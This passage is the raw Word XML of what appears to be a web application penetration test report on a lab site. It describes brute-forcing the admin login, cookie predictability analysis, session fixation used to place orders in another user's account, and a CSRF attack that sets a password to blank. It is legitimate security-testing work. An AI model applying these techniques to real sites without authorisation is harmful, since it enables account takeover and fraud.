        <w:t xml:space="preserve"> there are no checks on the number of attempts allowed to try and login to the </w:t>
      </w:r>
      <w:r w:rsidR="00AC2F3A">
        <w:t xml:space="preserve">website it </w:t>
      </w:r>
      <w:r w:rsidR="004025FD">
        <w:t>can be assumed that</w:t>
      </w:r>
      <w:r w:rsidR="00AC2F3A">
        <w:t xml:space="preserve"> vulnerable to a brute force attack. This was carried out on the admin section in order to gain further information on the website. </w:t>
      </w:r>
      <w:r w:rsidR="009166DD">
        <w:t xml:space="preserve">This step was preformed using a variation of the script used earlier in this </w:t>
      </w:r>
      <w:r w:rsidR="009166DD" w:rsidRPr="00EA2E30">
        <w:t>section</w:t>
      </w:r>
      <w:r w:rsidR="004025FD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006776DA" w:rsidRPr="00EA2E30">
        <w:t>(Appendix</w:t>
      </w:r>
      <w:r w:rsidR="00EA2E30" w:rsidRPr="00EA2E30">
        <w:t xml:space="preserve"> 5.6</w:t>
      </w:r>
      <w:r w:rsidR="006776DA" w:rsidRPr="00EA2E30">
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="009166DD" w:rsidRPr="00EA2E30">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20924E00" w14:textId="77777777" w:rsidR="00A40967" w:rsidRDefault="00A40967" w:rsidP="00EA2E30">
      <w:pPr>
        <w:ind w:left="578"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6FF43FBC" wp14:editId="083E0709">
            <wp:extent cx="4591050" cy="1282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3406" cy="1294082"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C71E4F" w14:textId="77777777" w:rsidR="00B6378B" w:rsidRDefault="004025FD" w:rsidP="00AF55D9">
      <w:pPr>
        <w:ind w:left="578"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">During step 1.1 </w:t>
      </w:r>
      <w:r w:rsidR="008571B9">
        <w:t>a URL</w:t>
      </w:r>
      <w:r w:rsidR="00C72B7C">
        <w:t xml:space="preserve"> was discovered</w:t>
      </w:r>
      <w:r w:rsidR="00A6559E">
        <w:t xml:space="preserve"> that used the debug flag</w:t>
      </w:r>
      <w:r w:rsidR="00C72B7C">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00A6559E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C72B7C">
        <w:t>H</w:t>
      </w:r>
      <w:r w:rsidR="00A6559E">
        <w:t>owever</w:t>
      </w:r>
      <w:r w:rsidR="00C72B7C">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00A6559E">
        <w:t xml:space="preserve"> when it was </w:t>
      </w:r>
      <w:r w:rsidR="00C72B7C">
        <w:t>navigated to it</w:t>
      </w:r>
      <w:r w:rsidR="00A6559E">
        <w:t xml:space="preserve"> resulted in an </w:t>
      </w:r>
      <w:r w:rsidR="00A6559E" w:rsidRPr="00A6559E">
        <w:t xml:space="preserve">Error 404 </w:t>
      </w:r>
      <w:r w:rsidR="00A6559E">
        <w:t xml:space="preserve">object not found </w:t>
      </w:r>
      <w:r w:rsidR="006776DA">
        <w:t>response</w:t>
      </w:r>
      <w:r w:rsidR="00A6559E">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE27B0B" w14:textId="77777777" w:rsidR="008571B9" w:rsidRDefault="008571B9" w:rsidP="004025FD">
      <w:pPr>
        <w:ind w:left="578"/>
        <w:rPr>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC5E74">
        <w:rPr>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/accounts.php%20debug=true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37970D45" w14:textId="77777777" w:rsidR="00BF3571" w:rsidRDefault="00BF3571" w:rsidP="004025FD">
      <w:pPr>
        <w:ind w:left="578"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38E4D35A" w14:textId="77777777" w:rsidR="00AC7A5E" w:rsidRDefault="00257FFB" w:rsidP="00AC7A5E">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="32" w:name="_Toc58836584"/>
      <w:r>
        <w:t>Procedure: Test Session Management</w:t>
      </w:r>
      <w:bookmarkEnd w:id="32"/>
    </w:p>
    <w:p w14:paraId="3D8D01E1" w14:textId="500D539D" w:rsidR="00A96FF0" w:rsidRDefault="00A96FF0" w:rsidP="00A96FF0">
      <w:r>
        <w:t xml:space="preserve">The session management is one of the </w:t>
      </w:r>
      <w:r w:rsidR="00A32685">
        <w:t xml:space="preserve">most straight forward </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">sections to look at as it has the smallest attack surface. However, while this means it should be easy to secure, it can also be the most easily compromised components of a website if handled poorly. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="658DFAF0" w14:textId="77777777" w:rsidR="00BF3571" w:rsidRPr="00A96FF0" w:rsidRDefault="00BF3571" w:rsidP="00A96FF0"/>
    <w:p w14:paraId="12E0C01A" w14:textId="77777777" w:rsidR="00EE193D" w:rsidRDefault="00EE193D" w:rsidP="00AC7A5E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="33" w:name="_Toc58836585"/>
      <w:r>
        <w:t>Understand the Mechanism</w:t>
      </w:r>
      <w:bookmarkEnd w:id="33"/>
    </w:p>
    <w:p w14:paraId="53366309" w14:textId="77777777" w:rsidR="00EE193D" w:rsidRDefault="00E46A6E" w:rsidP="00AC7A5E">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">By logging in and looking in the developer tools it can be seen that </w:t>
      </w:r>
      <w:r w:rsidR="00CB0B35" w:rsidRPr="00E46A6E">
        <w:t>sessions are controlled using a</w:t>
      </w:r>
      <w:r w:rsidR="00F33EAA" w:rsidRPr="00E46A6E">
        <w:t xml:space="preserve"> PHP</w:t>
      </w:r>
      <w:r w:rsidR="00CB0B35" w:rsidRPr="00E46A6E">
        <w:t xml:space="preserve"> session management cookie</w:t>
      </w:r>
      <w:r w:rsidR="00F33EAA" w:rsidRPr="00E46A6E">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="0006217C">
        <w:t xml:space="preserve">When set correctly this can provide a high level of security to the web application and prevent </w:t>
      </w:r>
      <w:r>
        <w:t>users form accessing content, they are not authorised to access. While there is also a secretcookie that is generated by the session management procedure, it does not affect the sessions in any way.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="688235F2" w14:textId="77777777" w:rsidR="00BF3571" w:rsidRDefault="00BF3571" w:rsidP="00AC7A5E">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="665C7169" w14:textId="77777777" w:rsidR="004C46DA" w:rsidRDefault="00EE193D" w:rsidP="002367AD">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:left="578"/>
      </w:pPr>
      <w:bookmarkStart w:id="34" w:name="_Toc58836586"/>
      <w:r>
        <w:t>Test Tokens for Predictability</w:t>
      </w:r>
      <w:bookmarkEnd w:id="34"/>
    </w:p>
    <w:p w14:paraId="0377A396" w14:textId="77777777" w:rsidR="002367AD" w:rsidRPr="002367AD" w:rsidRDefault="002367AD" w:rsidP="00AC7A5E">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>In order to test</w:t>
      </w:r>
      <w:r w:rsidR="00163C9D">
        <w:t xml:space="preserve"> the predictability of the cookies a sample of 100 was fed into web scarab and analyzed using the visualization tab. This resulted in the graphs below that show that while there </w:t>
      </w:r>
      <w:r w:rsidR="00163C9D">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">are parts of the SecretCookie that are predictable, namely the ‘random’ number that appears at the end. However the PHPSESSID would appear to be </w:t>
      </w:r>
      <w:r w:rsidR="0026391D">
        <w:t>completely random.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4208"/>
        <w:gridCol w:w="4243"/>
      </w:tblGrid>
      <w:tr w:rsidR="002367AD" w14:paraId="1EEECC26" w14:textId="77777777" w:rsidTr="00163C9D">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3553" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1FCB6E30" w14:textId="77777777" w:rsidR="002367AD" w:rsidRDefault="00163C9D" w:rsidP="002367AD">
            <w:r>
              <w:t>PHPSESSID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4243" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5A4EDFDB" w14:textId="77777777" w:rsidR="002367AD" w:rsidRDefault="00163C9D" w:rsidP="002367AD">
            <w:r>
              <w:t>SecretCookie</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002367AD" w14:paraId="0C80B418" w14:textId="77777777" w:rsidTr="00163C9D">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3553" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4A1A7D62" w14:textId="77777777" w:rsidR="002367AD" w:rsidRDefault="002367AD" w:rsidP="002367AD">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4EA0A1EF" wp14:editId="03713A79">
                  <wp:extent cx="2535098" cy="14232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3061" cy="1444598"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4243" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7548FF8D" w14:textId="77777777" w:rsidR="002367AD" w:rsidRDefault="002367AD" w:rsidP="002367AD">
            <w:pPr>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="29DCF5F8" wp14:editId="1CD505E9">
                  <wp:extent cx="2557335" cy="1399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0031" cy="1439211"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4089B78A" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRDefault="002A1D22" w:rsidP="002A1D22">
      <w:bookmarkStart w:id="35" w:name="_Toc58836587"/>
    </w:p>
    <w:p w14:paraId="7E52F329" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="00EE193D" w:rsidP="00EE193D">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Check for Insecure Transmission of Tokens</w:t>
      </w:r>
      <w:bookmarkEnd w:id="35"/>
    </w:p>
    <w:p w14:paraId="4F47576B" w14:textId="77777777" w:rsidR="00F33EAA" w:rsidRDefault="00F33EAA" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>The Website uses the HTTP protocol to send data so the cookie can be captured and viewed by a malicious actor</w:t>
      </w:r>
      <w:r w:rsidR="00337ED3">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00EE6186">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004041F8">
        <w:t>This becomes a problem in particular because</w:t>
      </w:r>
      <w:r w:rsidR="00EE6186">
        <w:t xml:space="preserve"> the secure flag is not set</w:t>
      </w:r>
      <w:r w:rsidR="004041F8">
        <w:t>. This means that even though the web application is using HTTP, it still allows the cookie to be sent as can be seen below</w:t>
      </w:r>
      <w:r w:rsidR="00EE6186">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF17085" w14:textId="77777777" w:rsidR="00EE6186" w:rsidRDefault="00EE6186" w:rsidP="00EE6186">
      <w:pPr>
        <w:ind w:left="708"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="335074D1" wp14:editId="309E401B">
            <wp:extent cx="5049079" cy="538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469" cy="556758"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F76978E" w14:textId="77777777" w:rsidR="00EE6186" w:rsidRDefault="00EE6186" w:rsidP="00EE6186">
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A0D22A" w14:textId="77777777" w:rsidR="00EE193D" w:rsidRDefault="00EE193D" w:rsidP="00EE193D">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="36" w:name="_Toc58836588"/>
      <w:r>
        <w:t>Check for Disclosure of Tokens in Logs</w:t>
      </w:r>
      <w:bookmarkEnd w:id="36"/>
    </w:p>
    <w:p w14:paraId="5BAB7C35" w14:textId="77777777" w:rsidR="00EE193D" w:rsidRDefault="00337ED3" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When </w:t>
      </w:r>
      <w:r w:rsidR="00FA66E8">
        <w:t>the mapping data for the web application was captured, an analysis was done to search for any log files</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00FA66E8">
        <w:t>However, when</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> this </w:t>
      </w:r>
      <w:r w:rsidR="00FA66E8">
        <w:t>stage was carried out</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> n</w:t>
      </w:r>
      <w:r w:rsidR="00EE193D">
        <w:t>o logs where found</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that could lead to the disclosure of tokens.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CC8ED1F" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRDefault="002A1D22" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="233D9F5F" w14:textId="77777777" w:rsidR="00EE193D" w:rsidRDefault="00EE193D" w:rsidP="00EE193D">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="37" w:name="_Toc58836589"/>
      <w:r>
        <w:t>Check Mapping of Tokens to Sessions</w:t>
      </w:r>
      <w:bookmarkEnd w:id="37"/>
    </w:p>
    <w:p w14:paraId="0E17C293" w14:textId="77777777" w:rsidR="00EE193D" w:rsidRDefault="00337ED3" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>It is possible to login to the same user account from multiple sessions. Indicating that no checks are carried out to prevent this.</w:t>
      </w:r>
      <w:r w:rsidR="004041F8">
        <w:t xml:space="preserve"> This was tested by logging into the same account from the Kali VM and from the windows desktop.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40904AAF" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRDefault="002A1D22">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A8DE7C6" w14:textId="77777777" w:rsidR="00EE193D" w:rsidRDefault="00EE193D" w:rsidP="00EE193D">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="38" w:name="_Toc58836590"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Test Session Termination</w:t>
      </w:r>
      <w:bookmarkEnd w:id="38"/>
    </w:p>
    <w:p w14:paraId="31018CB8" w14:textId="2A4D937D" w:rsidR="00EE193D" w:rsidRDefault="00337ED3" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">It would appear that there </w:t>
      </w:r>
      <w:r w:rsidR="000336B8">
        <w:t xml:space="preserve">are </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">no termination of sessions that are left open. </w:t>
      </w:r>
      <w:r w:rsidR="001E2ABA">
        <w:t>In order to test this</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> a session was left open for approximately 10 hours</w:t>
      </w:r>
      <w:r w:rsidR="000336B8">
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> it remained active. This either means that there is no termination of sessions or that the length of time is long enough as to be virtually useless.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23803700" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRDefault="002A1D22" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08CAD1C5" w14:textId="77777777" w:rsidR="00EE193D" w:rsidRDefault="00EE193D" w:rsidP="00EE193D">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="39" w:name="_Toc58836591"/>
      <w:r>
        <w:t>Check for Session Fixation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="39"/>
    </w:p>
    <w:p w14:paraId="67DE3314" w14:textId="77777777" w:rsidR="00EE193D" w:rsidRDefault="0018377B" w:rsidP="00396EED">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The website does not issue a new cookie when logged in </w:t>
      </w:r>
      <w:r w:rsidR="00396EED">
        <w:t>indicating i</w:t>
      </w:r>
      <w:r w:rsidR="00EE193D">
        <w:t xml:space="preserve">t is vulnerable to </w:t>
      </w:r>
      <w:r w:rsidR="00396EED">
        <w:t>session fixation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525A6F2A" w14:textId="77777777" w:rsidR="00396EED" w:rsidRDefault="00396EED" w:rsidP="00396EED">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>Session1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7267837C" w14:textId="77777777" w:rsidR="00396EED" w:rsidRDefault="00396EED" w:rsidP="00396EED">
      <w:pPr>
        <w:ind w:left="578" w:firstLine="130"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="242424"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="242424"/>
        </w:rPr>
        <w:t>o2a2g68t3v8avgskdubaku6hm3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="082C151A" w14:textId="77777777" w:rsidR="00396EED" w:rsidRDefault="00396EED" w:rsidP="00396EED">
      <w:pPr>
        <w:ind w:left="708"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="242424"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Session2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E322D09" w14:textId="77777777" w:rsidR="001010C2" w:rsidRDefault="001010C2" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="578" w:firstLine="130"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="242424"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="242424"/>
        </w:rPr>
        <w:t>o2a2g68t3v8avgskdubaku6hm3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F67AA7" w14:textId="77777777" w:rsidR="00A6559E" w:rsidRDefault="00396EED" w:rsidP="00A6559E">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>Based on this a test was carried out on the login function in an attempt to impersonate the user</w:t>
      </w:r>
      <w:r w:rsidR="00B44FC9">
        <w:t xml:space="preserve"> as well as the comment and order functions. Session hijacking was only successful on the order function which involved the editing of the header in </w:t>
      </w:r>
      <w:r w:rsidR="00B44FC9" w:rsidRPr="00DA102C">
        <w:t>Appendix</w:t>
      </w:r>
      <w:r w:rsidR="00930A27" w:rsidRPr="00DA102C">
        <w:t xml:space="preserve"> 5.1</w:t>
      </w:r>
      <w:r w:rsidR="00B44FC9">
        <w:t xml:space="preserve"> to Include the PHPSESSID shown above. This order then appeared in the basket of the Rick Astley user, even though it had been submitted while logged in as a test user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BCC1DFA" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRPr="00396EED" w:rsidRDefault="002A1D22" w:rsidP="00A6559E">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40A6DA55" w14:textId="77777777" w:rsidR="00DE429F" w:rsidRDefault="00DE429F" w:rsidP="00DE429F">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="40" w:name="_Toc58836592"/>
      <w:r>
        <w:t xml:space="preserve">Check for </w:t>
      </w:r>
      <w:r w:rsidR="001461D4">
        <w:t>CSRF</w:t>
      </w:r>
      <w:bookmarkEnd w:id="40"/>
    </w:p>
    <w:p w14:paraId="5C12D8E7" w14:textId="77777777" w:rsidR="004C3C01" w:rsidRDefault="004C3C01" w:rsidP="00DE429F">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">After reviewing the active Zap scan in section 7.1 this section was re-evaluated based on the results. </w:t>
      </w:r>
      <w:r w:rsidR="00EF0C8C">
        <w:t>Specifically,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> one of the results which suggested that Cross Sight Request Forgery (CSRF) was possible on this web application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A17F094" w14:textId="77777777" w:rsidR="004C3C01" w:rsidRDefault="004C3C01" w:rsidP="00DE429F">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="420E1EE7" wp14:editId="32C46E9E">
            <wp:extent cx="3476625" cy="45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25" cy="457200"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="637555B9" w14:textId="77777777" w:rsidR="00DE429F" w:rsidRDefault="004C3C01" w:rsidP="00DE429F">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>Therefore, a</w:t>
      </w:r>
      <w:r w:rsidR="001461D4">
        <w:t xml:space="preserve">n attempt to </w:t>
      </w:r>
      <w:r>
        <w:t>perform</w:t>
      </w:r>
      <w:r w:rsidR="001461D4">
        <w:t xml:space="preserve"> a CSRF was made on the password reset function. This was done using the code found in </w:t>
      </w:r>
      <w:r w:rsidR="001461D4" w:rsidRPr="00DA102C">
        <w:t>Appendix</w:t>
      </w:r>
      <w:r w:rsidR="00DA102C">
        <w:t xml:space="preserve"> 5.2</w:t>
      </w:r>
      <w:r w:rsidR="001461D4">
        <w:t xml:space="preserve">. This appeared not to work initially as there is some conflict with the variable names. However, this is irrelevant as it sets the password to “” meaning </w:t>
      </w:r>
      <w:r w:rsidR="006E3278">
        <w:t>that the login password is left blank and can be logged in regardless.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="276692FE" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRPr="00EE193D" w:rsidRDefault="002A1D22" w:rsidP="00DE429F">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2521EC9F" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="00257FFB" w:rsidP="00257FFB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="41" w:name="_Toc58836593"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Procedure: Test Access Controls</w:t>
      </w:r>
      <w:bookmarkEnd w:id="41"/>
    </w:p>
    <w:p w14:paraId="217F5B24" w14:textId="77777777" w:rsidR="001A2128" w:rsidRPr="001A2128" w:rsidRDefault="00C44F04" w:rsidP="001A2128">
      <w:r>
        <w:t xml:space="preserve">In order to test the access controls an analysis of the </w:t>
      </w:r>
      <w:r w:rsidR="00AD1C1E">
        <w:t xml:space="preserve">previous sections was made to determine what functionality the web application keeps behind </w:t>
      </w:r>
      <w:r w:rsidR="006D0026">
        <w:t xml:space="preserve">an authentication mechanism and how it </w:t>
      </w:r>
      <w:r w:rsidR="00AD1C1E">
        <w:t xml:space="preserve">grants access to secure areas of the </w:t>
      </w:r>
      <w:r w:rsidR="006D0026">
        <w:t>web application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD84394" w14:textId="77777777" w:rsidR="00257FFB" w:rsidRDefault="00EE193D" w:rsidP="00EE193D">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="42" w:name="_Toc58836594"/>
      <w:r>
        <w:t>Understand the Access Control Requirements</w:t>
      </w:r>
      <w:bookmarkEnd w:id="42"/>
    </w:p>
    <w:p w14:paraId="5CA553E3" w14:textId="77777777" w:rsidR="005A6148" w:rsidRDefault="009D0806" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
      <w:r>
        <w:t>Because t</w:t>
      </w:r>
      <w:r w:rsidR="005A6148">
        <w:t>here are no vertical levels of users</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> there is not the ability to attempt privilege escalation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D902479" w14:textId="77777777" w:rsidR="002A1D22" w:rsidRDefault="002A1D22" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DD41D36" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA77FF">
      <w:pPr>
        <w:ind w:left="708"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D715FA2" w14:textId="77777777" w:rsidR="00034004" w:rsidRPr="00034004" w:rsidRDefault="001A6BBB" w:rsidP="00034004">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="43" w:name="_Toc58836595"/>
      <w:r>
        <w:t>Test for Insecure Access Control Methods</w:t>
      </w:r>
      <w:bookmarkEnd w:id="43"/>
    </w:p>
